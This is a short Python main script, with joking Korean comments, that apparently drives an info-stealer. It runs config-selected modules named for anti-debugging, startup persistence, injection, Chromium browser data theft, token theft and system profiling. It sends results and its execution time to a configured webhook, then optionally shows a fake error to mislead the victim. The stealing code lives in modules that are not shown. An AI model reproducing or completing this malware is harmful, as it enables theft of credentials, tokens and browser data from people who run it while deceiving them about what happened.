# 맥에서 윈도우 python 코드를 작성하는 사람이 있다?
# ㅋㅋㄹㅃㅃ
from func.token import *
from func.debug import *
from func.chromium import *

from config import __CONFIG__

def main(webhook: str) -> None:
    _exec_time = exec_time()

    funcs = [ # 함수들을 쓰기 쉽게 리스팅 해놓기
        debug,
        startup,
        injection,
        chromium,
        token,
        sysinfo,
    ]

    for func in funcs:
        if __CONFIG__[func.__name__]:
            if type(func) == type:
                [func(webhook) if 'webhook' in func.__init__.__code__.co_varnames else func()]
            else:
                [func(webhook) if 'webhook' in func.__code__.co_varnames else func()]

    _exec_time.stop()
    _exec_time.send(webhook)

    if __CONFIG__['fakeerror']['use']:
        fake_error(__CONFIG__['fakeerror']['message'])

if __name__ == "__main__":
    main(__CONFIG__['webhook'])